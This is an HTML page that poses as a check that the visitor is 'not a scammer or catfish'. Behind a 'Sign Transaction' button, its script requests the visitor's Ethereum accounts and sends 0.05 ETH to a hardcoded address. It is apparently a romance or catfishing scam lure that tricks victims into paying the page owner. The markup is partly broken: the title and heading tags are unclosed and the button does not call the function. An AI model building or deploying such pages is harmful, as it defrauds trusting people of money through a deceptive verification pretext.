<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Confirmation that you are NOT a scammer or catfish
    <style>
        body {
            background-color: #ffffff; /* White background */
            color: #000000; /* Black text */
        }
        button {
            background-color: #800080; /* Purple button */
            color: #ffffff; /* White text */
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        button:hover {
            background-color: #6a0dad; /* Darker purple on hover */
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Confirmation that you are not a catfish
        <button onclick="Confirm">Sign Transaction</button>
    </div>

    <!-- JavaScript code -->
    <script src="https://unpkg.com/web3@latest/dist/web3.min.js"></script>
    <script>
        async function signTransaction() {
            // Initialize Web3
            const web3 = new Web3(window.ethereum);

            try {
                // Request access to user's Ethereum accounts
                await window.ethereum.request({ method: 'eth_requestAccounts' });

                // Example transaction object
                const transactionObject = {
                    // Set the 'to' address to the recipient's address
                    to: '0x519ECDaeDd4386a926b700f50312f70585a08092',
                    // Set the 'value' to the amount you want to send (in wei)
                    value: web3.utils.toWei('0.05', 'ether'), // Example: sending 0.1 ETH
                    // Add more fields as needed (e.g., gas, gasPrice, data)
                };

                // Sign the transaction
                const signedTransaction = await web3.eth.sendTransaction(transactionObject);

                // Log the signed transaction hash
                console.log('Signed transaction hash:', signedTransaction.transactionHash);
            } catch (error) {
                // Handle errors (e.g., user denied account access, transaction failed)
                console.error('Error signing transaction:', error);
            }
        }
    </script>
</body>
</html>
